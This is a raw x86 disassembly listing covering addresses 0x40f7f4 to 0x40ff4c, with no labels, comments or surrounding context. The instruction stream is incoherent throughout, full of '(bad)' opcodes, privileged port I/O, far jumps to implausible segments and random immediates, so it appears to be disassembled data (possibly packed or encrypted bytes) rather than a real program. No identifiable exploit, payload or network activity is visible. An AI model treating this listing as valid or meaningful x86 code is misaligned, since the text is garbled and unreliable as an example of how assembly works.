  40f7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f5:	stc    
  40f7f6:	aam    0xa9
  40f7f8:	xor    al,0x46
  40f7fa:	sbb    esp,DWORD PTR [eax]
  40f7fc:	sbb    eax,0xa2e1bdcd
  40f801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f802:	add    edx,DWORD PTR [ecx]
  40f804:	retf   0x9ab6
  40f807:	scas   eax,DWORD PTR es:[edi]
  40f808:	out    dx,al
  40f809:	(bad)  
  40f80a:	stos   BYTE PTR es:[di],al
  40f80c:	sahf   
  40f80d:	sbb    eax,0xcc134eeb
  40f812:	shr    BYTE PTR [ebp+0x46],0x16
  40f816:	mov    edi,0x9ed9247
  40f81b:	inc    edx
  40f81c:	loop   0x40f867
  40f81e:	sub    DWORD PTR [edi],0xae2f6bf3
  40f824:	das    
  40f825:	ds cld 
  40f827:	dec    ebx
  40f828:	sbb    DWORD PTR [eax],esi
  40f82a:	gs lahf 
  40f82c:	lods   al,BYTE PTR ds:[esi]
  40f82d:	pop    es
  40f82e:	mov    ds:0x632bd20f,al
  40f833:	repnz adc cl,BYTE PTR [esi+0x7e3e5531]
  40f83a:	dec    edi
  40f83b:	nop
  40f83c:	in     eax,0xc1
  40f83e:	pushf  
  40f83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f840:	ins    DWORD PTR es:[edi],dx
  40f841:	push   ebp
  40f842:	ret    
  40f843:	stos   BYTE PTR es:[edi],al
  40f844:	ret    0x39d4
  40f847:	fistp  WORD PTR [edi]
  40f849:	push   ecx
  40f84a:	mov    ds:0x81b5e42f,eax
  40f84f:	jmp    0x16bf:0x6b65b008
  40f856:	inc    esp
  40f857:	jg     0x40f872
  40f859:	or     BYTE PTR [edi-0x1d388d85],ch
  40f85f:	sub    ebp,DWORD PTR [ebp-0x792d05fb]
  40f865:	mov    eax,ds:0xc39b3050
  40f86a:	inc    ebp
  40f86b:	pop    ecx
  40f86c:	cmp    eax,ebp
  40f86e:	(bad)  
  40f86f:	mov    ah,cl
  40f871:	stos   BYTE PTR es:[edi],al
  40f872:	or     BYTE PTR [eax-0x73],al
  40f875:	loop   0x40f7fb
  40f877:	pop    edi
  40f878:	ss retf 
  40f87a:	pop    esi
  40f87b:	call   0xdbb4:0x81433cb1
  40f882:	inc    ebx
  40f883:	push   ecx
  40f884:	pop    ss
  40f885:	add    bh,ah
  40f887:	jae    0x40f819
  40f889:	lods   eax,DWORD PTR ds:[esi]
  40f88a:	push   es
  40f88b:	jne    0x40f854
  40f88d:	int3   
  40f88e:	(bad)  
  40f88f:	sub    BYTE PTR [ecx-0x72],cl
  40f892:	fistp  WORD PTR [edi+0x3d610a97]
  40f898:	mov    eax,ds:0x9e83c6ba
  40f89d:	fstp   QWORD PTR [ebx+0x5619a1ae]
  40f8a3:	ret    
  40f8a4:	call   0x77d2:0xdaea6ad2
  40f8ab:	mov    bl,0xe1
  40f8ad:	inc    ebx
  40f8ae:	std    
  40f8af:	or     al,dl
  40f8b1:	and    BYTE PTR [ebp+0x2154339a],bh
  40f8b7:	data16 (bad) 
  40f8b9:	mov    edi,0x534cbd0a
  40f8be:	push   0xc3203cc5
  40f8c3:	mov    esi,0xc8db0042
  40f8c8:	and    BYTE PTR ds:[edx-0x4d78fdd2],0x3f
  40f8d0:	and    eax,0x5393df5d
  40f8d5:	pop    ecx
  40f8d6:	scas   eax,DWORD PTR es:[edi]
  40f8d7:	icebp  
  40f8d8:	mov    ebx,0x21153017
  40f8dd:	iret   
  40f8de:	mov    cl,0x35
  40f8e0:	sbb    al,BYTE PTR [ecx]
  40f8e2:	mov    BYTE PTR [si],ah
  40f8e5:	ret    
  40f8e6:	mov    ds:0x3de4a911,al
  40f8eb:	iret   
  40f8ec:	dec    esp
  40f8ed:	push   0x4b
  40f8ef:	sub    al,0x13
  40f8f1:	int3   
  40f8f2:	or     BYTE PTR [ecx-0x16],ah
  40f8f5:	das    
  40f8f6:	and    eax,0x2fd837a7
  40f8fb:	xchg   edx,eax
  40f8fc:	jge    0x40f8bf
  40f8fe:	xchg   ecx,eax
  40f8ff:	es loopne 0x40f885
  40f902:	in     al,0x19
  40f904:	sbb    BYTE PTR [ecx],dh
  40f906:	popf   
  40f907:	fbstp  TBYTE PTR ds:0xe5e08b01
  40f90d:	and    edi,DWORD PTR [edx+0x6b]
  40f910:	cmp    DWORD PTR [ebx-0x43],esi
  40f913:	icebp  
  40f914:	add    eax,0xf1298058
  40f919:	repnz leave 
  40f91b:	xchg   bl,bl
  40f91d:	add    BYTE PTR [edx+ebp*1+0x2a9bbe8c],dh
  40f924:	repnz dec ecx
  40f926:	push   ecx
  40f927:	js     0x40f8da
  40f929:	hlt    
  40f92a:	sub    al,0xa3
  40f92c:	pop    ds
  40f92d:	push   ecx
  40f92e:	fsub   QWORD PTR [esi-0x14409106]
  40f934:	into   
  40f935:	shl    DWORD PTR ds:0xd06e5c12,1
  40f93b:	inc    edi
  40f93c:	mov    esi,0x179ab13
  40f941:	fsincos 
  40f943:	das    
  40f944:	jl     0x40f8e0
  40f946:	push   edi
  40f947:	pavgw  mm0,mm0
  40f94a:	popf   
  40f94b:	adc    DWORD PTR [eax-0x53],0xffffffde
  40f94f:	repz inc eax
  40f951:	hlt    
  40f952:	test   ebp,0x12fa5e46
  40f958:	adc    DWORD PTR [edx],esp
  40f95a:	and    al,0x33
  40f95c:	(bad)  
  40f95d:	repnz out 0xe6,al
  40f960:	dec    edx
  40f961:	fwait
  40f962:	enter  0x94a2,0x5b
  40f966:	and    BYTE PTR [ecx],ah
  40f968:	mov    ebp,0x3ab93b99
  40f96d:	inc    ebp
  40f96e:	jmp    0x3da6dfa3
  40f973:	and    ecx,DWORD PTR [ebp+ebx*4-0x5a]
  40f977:	shr    dl,1
  40f979:	push   ecx
  40f97a:	ror    edi,cl
  40f97c:	pop    ss
  40f97d:	jmp    0x40f964
  40f97f:	pop    esi
  40f980:	push   0xbb075a48
  40f985:	or     ch,BYTE PTR [ebx]
  40f987:	xor    eax,0xf568b535
  40f98c:	xchg   edx,eax
  40f98d:	stc    
  40f98e:	xor    DWORD PTR [ecx+0x61e02079],0x62cd68d4
  40f998:	bound  edi,QWORD PTR [esi-0x2bcd1be8]
  40f99e:	mov    ecx,0x37facf9
  40f9a3:	cmp    DWORD PTR [esi-0x61],eax
  40f9a6:	dec    eax
  40f9a7:	std    
  40f9a8:	jp     0x40f9dc
  40f9aa:	adc    eax,0x529f95b2
  40f9af:	scas   eax,DWORD PTR es:[di]
  40f9b1:	sti    
  40f9b2:	push   0x176bea76
  40f9b7:	jne    0x40f9cb
  40f9b9:	sbb    eax,0x63e0e19a
  40f9be:	mov    dh,BYTE PTR ds:0xd2102b5a
  40f9c4:	(bad)  
  40f9c5:	out    dx,eax
  40f9c6:	imul   ebp,DWORD PTR [eax],0x53
  40f9c9:	addr16 (bad) 
  40f9cb:	dec    ebp
  40f9cc:	xchg   esi,eax
  40f9cd:	in     eax,dx
  40f9ce:	rol    BYTE PTR [edx-0x13a3849a],cl
  40f9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d5:	aam    0xd2
  40f9d7:	icebp  
  40f9d8:	jae    0x40f973
  40f9da:	lods   eax,DWORD PTR ds:[esi]
  40f9db:	or     cl,0x6
  40f9de:	adc    ebx,ebp
  40f9e0:	and    ecx,DWORD PTR [ecx+0x332599f1]
  40f9e6:	in     eax,0x80
  40f9e8:	jecxz  0x40f9de
  40f9ea:	lods   eax,DWORD PTR ds:[esi]
  40f9eb:	(bad)  
  40f9ec:	cmp    al,0x4f
  40f9ee:	mov    WORD PTR [ebp+0x7],?
  40f9f1:	loope  0x40f9ba
  40f9f3:	xchg   ecx,eax
  40f9f4:	(bad)  
  40f9f5:	jns    0x40f997
  40f9f7:	std    
  40f9f8:	adc    eax,0x2125d69a
  40f9fd:	loopne 0x40fa11
  40f9ff:	dec    ebp
  40fa00:	pop    esp
  40fa01:	push   ebx
  40fa02:	leave  
  40fa03:	rcl    DWORD PTR [esi+0x2f],cl
  40fa06:	in     al,dx
  40fa07:	mov    bl,0x77
  40fa09:	out    0x3f,eax
  40fa0b:	mov    edi,0xda2f2b0f
  40fa10:	lock mov ecx,0x8cbf88fb
  40fa16:	xchg   ebx,eax
  40fa17:	shl    BYTE PTR [ebx],cl
  40fa19:	cmp    DWORD PTR [edx],eax
  40fa1b:	xor    BYTE PTR [ebx],cl
  40fa1d:	inc    esi
  40fa1e:	xchg   ecx,eax
  40fa1f:	xchg   edi,eax
  40fa20:	imul   ebx,esp,0x14
  40fa23:	test   BYTE PTR [eax],ch
  40fa25:	jne    0x40fa65
  40fa27:	aad    0xf5
  40fa29:	clc    
  40fa2a:	sub    al,0xb6
  40fa2c:	xor    eax,0x4c67494a
  40fa31:	fild   QWORD PTR [ebx-0x37]
  40fa34:	xor    ecx,DWORD PTR [esi-0x71]
  40fa37:	jp     0x40fa54
  40fa39:	sbb    bl,BYTE PTR [edx+eiz*2+0x1]
  40fa3d:	cmp    al,0xd1
  40fa3f:	sub    bh,BYTE PTR [eax-0x50acfaab]
  40fa45:	adc    BYTE PTR [eax+esi*4-0x4b],bl
  40fa49:	mov    ebx,0x1cc708ca
  40fa4e:	fldcw  WORD PTR [edx]
  40fa50:	pushf  
  40fa51:	add    ecx,eax
  40fa53:	enter  0x28f9,0x83
  40fa57:	and    dl,0xd6
  40fa5a:	and    BYTE PTR [edx+0x23],dh
  40fa5d:	or     eax,0x552abce8
  40fa62:	sar    DWORD PTR [esi+0x6],0xba
  40fa66:	and    bl,al
  40fa68:	repnz push ebx
  40fa6a:	aam    0x85
  40fa6c:	add    BYTE PTR [edi-0x5f],dh
  40fa6f:	mov    ebp,0x9bbd1468
  40fa74:	test   ch,dh
  40fa76:	xchg   ebp,eax
  40fa77:	push   ds
  40fa78:	lahf   
  40fa79:	stc    
  40fa7a:	scas   eax,DWORD PTR es:[edi]
  40fa7b:	jecxz  0x40faf6
  40fa7d:	stos   BYTE PTR es:[edi],al
  40fa7e:	mov    esi,0x21e535e2
  40fa83:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40fa85:	mov    al,BYTE PTR [eax]
  40fa87:	jl     0x40fa93
  40fa89:	cdq    
  40fa8a:	jmp    0xb049a77d
  40fa8f:	ss add al,0x68
  40fa92:	and    cl,0xdc
  40fa95:	mov    esi,0xe32a1912
  40fa9a:	adc    eax,0x522e7b33
  40fa9f:	xchg   esi,eax
  40faa0:	cmp    edi,0x66f47332
  40faa6:	mov    ebp,cs
  40faa8:	pop    es
  40faa9:	test   dh,al
  40faab:	repz int 0x27
  40faae:	xchg   cl,al
  40fab0:	icebp  
  40fab1:	xor    ch,BYTE PTR [esi-0x532278a0]
  40fab7:	and    al,0x3d
  40fab9:	xor    eax,DWORD PTR [ecx+0x70]
  40fabc:	mov    ebp,0x860b49c3
  40fac1:	(bad)  
  40fac2:	push   edi
  40fac3:	and    ebx,DWORD PTR [ebp+0x1d4f6317]
  40fac9:	les    ebx,FWORD PTR [ebx]
  40facb:	and    esi,DWORD PTR [esi+0x1c6f6ee]
  40fad1:	jecxz  0x40fa96
  40fad3:	jp     0x40fad7
  40fad5:	loope  0x40fb4d
  40fad7:	leave  
  40fad8:	les    ecx,FWORD PTR [edi+0x14]
  40fadb:	cmp    eax,0x57f2bcc5
  40fae0:	push   ebp
  40fae1:	stos   BYTE PTR es:[edi],al
  40fae2:	inc    eax
  40fae3:	retf   
  40fae4:	leave  
  40fae5:	or     bl,BYTE PTR [edi-0x7f2eb36c]
  40faeb:	xchg   esp,eax
  40faec:	mov    dh,0xd4
  40faee:	je     0x40faf1
  40faf0:	push   0x25
  40faf2:	cmp    edx,DWORD PTR [ecx+0x0]
  40faf5:	cmp    DWORD PTR [edx],esp
  40faf7:	and    eax,0xbea93874
  40fafc:	int3   
  40fafd:	pop    eax
  40fafe:	idiv   eax
  40fb00:	(bad)  
  40fb01:	push   edi
  40fb02:	int3   
  40fb03:	xor    edi,edx
  40fb05:	sahf   
  40fb06:	fidivr DWORD PTR [ebp-0x1d1ceb96]
  40fb0c:	jecxz  0x40faf3
  40fb0e:	add    al,BYTE PTR [eax+0x2]
  40fb11:	cmp    ch,dh
  40fb13:	sahf   
  40fb14:	mov    ch,0xfd
  40fb16:	xchg   BYTE PTR [ecx-0x67],dh
  40fb19:	inc    edi
  40fb1a:	shr    BYTE PTR [edi],0xef
  40fb1d:	xchg   edi,eax
  40fb1e:	jnp    0x40fb1b
  40fb20:	cli    
  40fb21:	pop    ebp
  40fb22:	jb     0x40fb0e
  40fb24:	push   eax
  40fb25:	push   edx
  40fb26:	push   0xf43e5212
  40fb2b:	mov    cl,0x92
  40fb2d:	dec    edi
  40fb2e:	int3   
  40fb2f:	xor    DWORD PTR [ebp+edx*4-0x673b2f69],edx
  40fb36:	and    DWORD PTR [ebp-0x1aa9ea86],0xc
  40fb3d:	push   esp
  40fb3e:	cmp    eax,0xa39854f
  40fb43:	repnz or DWORD PTR [edx-0x2e645cb],eax
  40fb4a:	sar    DWORD PTR [ebx],cl
  40fb4c:	xchg   ebp,eax
  40fb4d:	xlat   BYTE PTR ds:[ebx]
  40fb4e:	push   ds
  40fb4f:	aaa    
  40fb50:	outs   dx,BYTE PTR ds:[esi]
  40fb51:	cmp    BYTE PTR [edi],0x7d
  40fb54:	call   esp
  40fb56:	sahf   
  40fb57:	pop    eax
  40fb58:	xor    eax,0x761accf6
  40fb5d:	mov    ebp,0xa0d69d9b
  40fb62:	in     al,dx
  40fb63:	loop   0x40fb49
  40fb65:	in     al,dx
  40fb66:	xchg   ecx,eax
  40fb67:	xor    DWORD PTR ds:0x881b973b,0x3d
  40fb6e:	mov    edx,0xf7144164
  40fb73:	pop    ds
  40fb74:	fist   DWORD PTR es:[ecx-0x12]
  40fb78:	cwde   
  40fb79:	das    
  40fb7a:	call   DWORD PTR [esi+0x486889aa]
  40fb80:	cmp    DWORD PTR [ebp+edi*1-0x7a],edx
  40fb84:	mov    BYTE PTR [ebx-0xb],dh
  40fb87:	sbb    esi,eax
  40fb89:	jmp    0xa521:0x749ba244
  40fb90:	sbb    DWORD PTR [ebx-0x23f2c48e],edx
  40fb96:	or     DWORD PTR [eax-0x8ae279e],ecx
  40fb9c:	sbb    eax,0x42e1a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x29
  40fbb3:	int    0x5
  40fbb5:	xchg   BYTE PTR [edx-0x5c8f8f4f],al
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fb6a
  40fbbf:	pop    esi
  40fbc0:	mov    dl,0x25
  40fbc2:	ror    dl,1
  40fbc4:	sahf   
  40fbc5:	out    0x9b,eax
  40fbc7:	leave  
  40fbc8:	iret   
  40fbc9:	adc    DWORD PTR [ebx-0x9],ecx
  40fbcc:	loope  0x40fc34
  40fbce:	aas    
  40fbcf:	or     eax,0x5ffba74a
  40fbd4:	push   es
  40fbd5:	into   
  40fbd6:	clc    
  40fbd7:	or     eax,0x443d41ab
  40fbdc:	mov    eax,0x63e04ead
  40fbe1:	mov    ch,0xa0
  40fbe3:	int    0xf8
  40fbe5:	sahf   
  40fbe6:	dec    esp
  40fbe7:	dec    esi
  40fbe8:	ror    DWORD PTR [ebx+0x44],0xa2
  40fbec:	ins    BYTE PTR es:[edi],dx
  40fbed:	jecxz  0x40fb92
  40fbef:	xor    al,0x2b
  40fbf1:	mov    ebp,0x126dc0bd
  40fbf6:	push   ecx
  40fbf7:	cmp    al,0xd8
  40fbf9:	push   edx
  40fbfa:	sbb    BYTE PTR [edi+0x798b8d98],dl
  40fc00:	and    al,0xa0
  40fc02:	mov    ds:0xbc7d4e4a,eax
  40fc07:	pop    es
  40fc08:	xor    DWORD PTR [edx-0x7],0x28
  40fc0c:	jae    0x40fc3f
  40fc0e:	sbb    edi,DWORD PTR [ebx-0x4f505137]
  40fc14:	dec    ebp
  40fc15:	jne    0x40fc1c
  40fc17:	ins    BYTE PTR es:[edi],dx
  40fc18:	push   edx
  40fc19:	jp     0x40fc06
  40fc1b:	xor    DWORD PTR [ebx+0x77bdcc41],0xb51e4864
  40fc25:	or     eax,0xf72c1182
  40fc2a:	pop    ds
  40fc2b:	test   DWORD PTR [eax+edi*4-0x73],ebx
  40fc2f:	arpl   WORD PTR [ebp+0x2c3329f8],bp
  40fc35:	ret    
  40fc36:	inc    esp
  40fc37:	sahf   
  40fc38:	jp     0x40fc20
  40fc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc3b:	mov    esi,0x24f890cd
  40fc40:	sbb    dl,dl
  40fc42:	stos   DWORD PTR es:[edi],eax
  40fc43:	push   ecx
  40fc44:	out    0xc7,eax
  40fc46:	std    
  40fc47:	retf   0xfd90
  40fc4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc4b:	pop    edx
  40fc4c:	(bad)  
  40fc4d:	je     0x40fcce
  40fc4f:	cmp    dh,dl
  40fc51:	mov    ebp,0x1e02a9ec
  40fc56:	jo     0x40fbe2
  40fc58:	sub    BYTE PTR [ebx+0x20ae7a8c],0x83
  40fc5f:	lea    ebx,[eax+0x7b]
  40fc62:	fdivr  DWORD PTR [esi]
  40fc64:	enter  0x6f0c,0x34
  40fc68:	sub    DWORD PTR [eax+edx*1],eax
  40fc6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc6c:	dec    edx
  40fc6d:	(bad)  
  40fc6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc6f:	in     al,0x6a
  40fc71:	lock sahf 
  40fc73:	out    0x31,al
  40fc75:	sbb    bl,al
  40fc77:	daa    
  40fc78:	cmp    BYTE PTR [edi+0x12ca5585],bl
  40fc7e:	je     0x40fc05
  40fc80:	aas    
  40fc81:	jo     0x40fcd8
  40fc83:	out    dx,eax
  40fc84:	mov    bh,0x4f
  40fc86:	adc    al,0x19
  40fc88:	pop    ebp
  40fc89:	add    al,0x11
  40fc8b:	pop    edx
  40fc8c:	(bad)  
  40fc8d:	jmp    0x40fc16
  40fc8f:	retf   
  40fc90:	fisttp DWORD PTR [ebp-0x28]
  40fc93:	push   es
  40fc94:	fistp  WORD PTR [esi-0x3f2a91e5]
  40fc9a:	push   0x4ff720b6
  40fc9f:	repz vpacksswb xmm4,xmm0,xmm2
  40fca4:	imul   edi,DWORD PTR [edx-0x64],0x2a
  40fca8:	mov    ah,dl
  40fcaa:	fdiv   DWORD PTR [esi+0x2370022e]
  40fcb0:	adc    DWORD PTR [ecx-0x4c],esi
  40fcb3:	adc    DWORD PTR [ecx-0x3],eax
  40fcb6:	sub    ecx,DWORD PTR [esi-0x1c]
  40fcb9:	ror    BYTE PTR [esi+0xe],1
  40fcbc:	das    
  40fcbd:	aaa    
  40fcbe:	popf   
  40fcbf:	jp     0x40fc76
  40fcc1:	sub    DWORD PTR [edi],edi
  40fcc3:	jecxz  0x40fcaf
  40fcc5:	xor    BYTE PTR [ebp+0x2c],ah
  40fcc8:	hlt    
  40fcc9:	xchg   ebx,eax
  40fcca:	iret   
  40fccb:	pop    esp
  40fccc:	pop    es
  40fccd:	xor    ecx,edx
  40fccf:	sbb    eax,0x892ad59a
  40fcd4:	fild   DWORD PTR [edx+0x3d864bc8]
  40fcda:	stc    
  40fcdb:	mov    ah,0x74
  40fcdd:	adc    eax,edi
  40fcdf:	sbb    al,0x8f
  40fce1:	sbb    bl,BYTE PTR [ebx]
  40fce3:	mov    edx,0x8acced25
  40fce8:	sahf   
  40fce9:	add    BYTE PTR [esp+eiz*2-0x37d9893f],al
  40fcf0:	dec    ecx
  40fcf1:	shr    DWORD PTR [esi-0x7ef4f70c],0x26
  40fcf8:	pop    es
  40fcf9:	outs   dx,BYTE PTR ds:[esi]
  40fcfa:	(bad)  
  40fcfb:	out    dx,eax
  40fcfc:	test   DWORD PTR [edx-0x6f],ecx
  40fcff:	xor    eax,0xd2696998
  40fd04:	jbe    0x40fce5
  40fd06:	(bad)  
  40fd07:	imul   edi,DWORD PTR [esi+0x0],0x64349a28
  40fd0e:	sub    eax,0x75fb4501
  40fd13:	add    DWORD PTR [esi-0x2a6ba951],ecx
  40fd19:	dec    ecx
  40fd1a:	fwait
  40fd1b:	mov    al,gs:0x611e1958
  40fd21:	mov    WORD PTR [eax-0x2e],fs
  40fd24:	mov    es,ebp
  40fd26:	hlt    
  40fd27:	inc    ebp
  40fd28:	mov    BYTE PTR [esi+0x33c036f7],bh
  40fd2e:	push   ss
  40fd2f:	aad    0xf7
  40fd31:	stc    
  40fd32:	xchg   ecx,eax
  40fd33:	or     BYTE PTR [ebx],bl
  40fd35:	mov    ecx,0x3971a24
  40fd3a:	mov    bl,0x59
  40fd3c:	sub    eax,0x94396bc2
  40fd41:	daa    
  40fd42:	xor    edx,DWORD PTR [ebp+0x4eaf316]
  40fd48:	adc    ebx,DWORD PTR [esi+0x62]
  40fd4b:	cld    
  40fd4c:	jae    0x40fd8f
  40fd4e:	inc    esi
  40fd4f:	iret   
  40fd50:	add    BYTE PTR [ebx],cl
  40fd52:	in     al,dx
  40fd53:	push   0xffffffd6
  40fd55:	jnp    0x40fcfe
  40fd57:	pop    ebx
  40fd58:	xor    ecx,esp
  40fd5a:	call   0x9603:0x3fddaffe
  40fd61:	mov    ebp,0x85a02b7b
  40fd66:	fcmovne st,st(2)
  40fd68:	lock cmp eax,0x71c19a1b
  40fd6e:	xor    eax,0x66a3bd4
  40fd73:	jnp    0x40fdc7
  40fd75:	cmp    bh,BYTE PTR [esi+ebp*8-0x70]
  40fd79:	addr16 popf 
  40fd7b:	jae    0x40fd10
  40fd7d:	int    0x95
  40fd7f:	adc    eax,0xa73e83a8
  40fd84:	inc    eax
  40fd85:	cmp    esp,ebp
  40fd87:	cld    
  40fd88:	xor    eax,0x7f9a9e13
  40fd8d:	mov    edx,0x7987748c
  40fd92:	sub    edi,eax
  40fd94:	jecxz  0x40fdb9
  40fd96:	jno    0x40fdbe
  40fd98:	add    dh,BYTE PTR [ecx+edx*2]
  40fd9b:	xchg   esp,eax
  40fd9c:	loop   0x40fdce
  40fd9e:	test   eax,0x701bc66a
  40fda3:	aas    
  40fda4:	mov    al,ds:0x4ea01a2b
  40fda9:	adc    eax,0xc0528fa0
  40fdae:	jo     0x40fd8a
  40fdb0:	ins    BYTE PTR es:[edi],dx
  40fdb1:	push   ds
  40fdb2:	jne    0x40fe28
  40fdb4:	scas   eax,DWORD PTR es:[edi]
  40fdb5:	inc    esp
  40fdb6:	mov    bh,0xaa
  40fdb8:	test   BYTE PTR [eax+0x11],bh
  40fdbb:	xchg   ecx,eax
  40fdbc:	dec    edx
  40fdbd:	and    ecx,DWORD PTR [ebp-0x322077dc]
  40fdc3:	push   edi
  40fdc4:	adc    BYTE PTR [edi],ah
  40fdc6:	mov    dl,BYTE PTR [eax]
  40fdc8:	out    0xd8,al
  40fdca:	iret   
  40fdcb:	or     BYTE PTR [eax+ebp*2+0x29],al
  40fdcf:	sbb    bl,dh
  40fdd1:	mov    ch,0xa4
  40fdd3:	xchg   edi,eax
  40fdd4:	add    esi,DWORD PTR [ebx]
  40fdd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdd7:	lods   al,BYTE PTR ds:[esi]
  40fdd8:	mov    bl,0x1e
  40fdda:	push   ds
  40fddb:	mov    ch,0xeb
  40fddd:	xor    eax,0x13679bb7
  40fde2:	jb     0x40fe44
  40fde4:	or     eax,0x3dc28645
  40fde9:	push   ds
  40fdea:	aas    
  40fdeb:	push   esi
  40fdec:	jle    0x40fe4c
  40fdee:	popf   
  40fdef:	nop
  40fdf0:	push   edx
  40fdf1:	ins    DWORD PTR es:[edi],dx
  40fdf2:	mov    cl,0x23
  40fdf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdf5:	popa   
  40fdf6:	and    BYTE PTR [ebp+0x6e],bl
  40fdf9:	cli    
  40fdfa:	mov    dl,0x7b
  40fdfc:	pop    edi
  40fdfd:	cwde   
  40fdfe:	pop    ebx
  40fdff:	retf   0xe36b
  40fe02:	test   dh,ah
  40fe04:	mov    ecx,0x53421fa3
  40fe09:	sub    al,0x75
  40fe0b:	in     al,0x27
  40fe0d:	jbe    0x40fdef
  40fe0f:	xchg   ecx,eax
  40fe10:	lock rol bh,cl
  40fe13:	sub    dl,al
  40fe15:	enter  0x4562,0x67
  40fe19:	push   ecx
  40fe1a:	mov    esi,0x1a3a0613
  40fe1f:	jb     0x40fe83
  40fe21:	inc    edx
  40fe22:	and    eax,0x7101a5f6
  40fe27:	push   esp
  40fe28:	and    al,0x70
  40fe2a:	in     eax,0xe8
  40fe2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe2d:	add    al,0xcd
  40fe2f:	sahf   
  40fe30:	int    0x3
  40fe32:	or     ecx,ebp
  40fe34:	call   0x79fa51b7
  40fe39:	pop    edx
  40fe3a:	mov    ebp,DWORD PTR [eax+ebx*1-0x584e1dd3]
  40fe41:	lahf   
  40fe42:	xor    DWORD PTR [edx+0x1d686601],edx
  40fe48:	pop    ebp
  40fe49:	syscall 
  40fe4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe4c:	fnstenv [ebx]
  40fe4e:	lods   eax,DWORD PTR ds:[esi]
  40fe4f:	mov    bl,0xf1
  40fe51:	cmp    al,0xc0
  40fe53:	imul   DWORD PTR [eax]
  40fe55:	jb     0x40fe3c
  40fe57:	in     eax,0xb7
  40fe59:	out    dx,al
  40fe5a:	jno    0x40fe4f
  40fe5c:	cmp    eax,0xbe1f627f
  40fe61:	adc    BYTE PTR [ecx-0x50],dh
  40fe64:	pop    esp
  40fe65:	aam    0xa0
  40fe67:	or     eax,0x3ae330a3
  40fe6c:	gs (bad) 
  40fe6e:	push   esi
  40fe6f:	pop    ecx
  40fe70:	jp     0x40fee5
  40fe72:	addr16 pop esp
  40fe74:	mov    dh,0x56
  40fe76:	or     dh,0x72
  40fe79:	push   ecx
  40fe7a:	inc    esi
  40fe7b:	cli    
  40fe7c:	xchg   edi,eax
  40fe7d:	mov    ebx,0x28b05731
  40fe82:	out    dx,eax
  40fe83:	xor    esi,DWORD PTR [ebx-0xc]
  40fe86:	mov    cl,0x5
  40fe88:	jo     0x40fe43
  40fe8a:	xchg   esi,eax
  40fe8b:	inc    ebx
  40fe8c:	test   DWORD PTR cs:[ecx+0x24],edx
  40fe90:	je     0x40fec0
  40fe92:	inc    ecx
  40fe93:	cmp    BYTE PTR [ebx+0x5c85373e],cl
  40fe99:	push   edx
  40fe9a:	(bad)  
  40fe9b:	jnp    0x40fe49
  40fe9d:	xchg   ecx,eax
  40fe9e:	test   BYTE PTR [esi],dh
  40fea0:	shr    eax,1
  40fea2:	repnz in eax,0xba
  40fea5:	mov    ah,0xd2
  40fea7:	inc    edi
  40fea8:	dec    DWORD PTR [edi*8+0x9ed333d]
  40feaf:	ffree  st(1)
  40feb1:	stc    
  40feb2:	call   0x44f69dbd
  40feb7:	jmp    0x40fee4
  40feb9:	or     DWORD PTR [ebx-0x13],esi
  40febc:	jmp    DWORD PTR [eax]
  40febe:	jnp    0x40fe81
  40fec0:	ret    
  40fec1:	sub    eax,ecx
  40fec3:	loope  0x40fe8c
  40fec5:	in     al,dx
  40fec6:	mov    esi,esi
  40fec8:	adc    bl,dh
  40feca:	ja     0x40ff22
  40fecc:	neg    BYTE PTR [edx+ebx*4]
  40fecf:	or     DWORD PTR [eax],edx
  40fed1:	ins    BYTE PTR es:[edi],dx
  40fed2:	push   edi
  40fed3:	push   ecx
  40fed4:	outs   dx,DWORD PTR ds:[esi]
  40fed5:	push   0x68
  40fed7:	hlt    
  40fed8:	adc    esp,DWORD PTR [ecx]
  40feda:	mov    ch,0x7d
  40fedc:	inc    edi
  40fedd:	ror    dl,cl
  40fedf:	stc    
  40fee0:	or     ebp,edi
  40fee2:	sbb    DWORD PTR [eax],ebp
  40fee4:	xchg   ebx,eax
  40fee5:	clc    
  40fee6:	popa   
  40fee7:	dec    edx
  40fee8:	sub    BYTE PTR [edi],dh
  40feea:	cdq    
  40feeb:	sub    eax,0xc2d3bee3
  40fef0:	(bad)  
  40fef2:	mov    ebx,0x133deba
  40fef7:	popa   
  40fef8:	and    eax,0x58f06d85
  40fefd:	dec    edi
  40fefe:	dec    eax
  40feff:	xchg   ecx,eax
  40ff00:	xchg   ecx,eax
  40ff01:	(bad)  [ecx]
  40ff03:	pop    eax
  40ff04:	and    eax,0xe096b001
  40ff09:	outs   dx,DWORD PTR ds:[esi]
  40ff0a:	fstp   st(6)
  40ff0c:	or     eax,0xc588e6f0
  40ff11:	inc    esp
  40ff12:	repz ret 0x59db
  40ff16:	push   ebx
  40ff17:	push   edi
  40ff18:	and    DWORD PTR [edx+0x68],0xffffff97
  40ff1c:	mov    eax,DWORD PTR [edx]
  40ff1e:	xchg   BYTE PTR [eax-0x54c90d30],ch
  40ff24:	xchg   ebp,ebx
  40ff26:	add    BYTE PTR [edx+0x4aa05673],dl
  40ff2c:	and    eax,0xb4bcde7d
  40ff31:	pop    ds
  40ff32:	cli    
  40ff33:	push   edi
  40ff34:	retf   0x779e
  40ff37:	ret    0x5a93
  40ff3a:	mov    DWORD PTR [ebx],edx
  40ff3c:	int    0x30
  40ff3e:	inc    eax
  40ff3f:	loop   0x40ffac
  40ff41:	jns    0x40ff7e
  40ff43:	jne    0x40ffa9
  40ff45:	test   BYTE PTR [ebx-0x4b51590c],0xba
  40ff4c:	and    ecx,esi
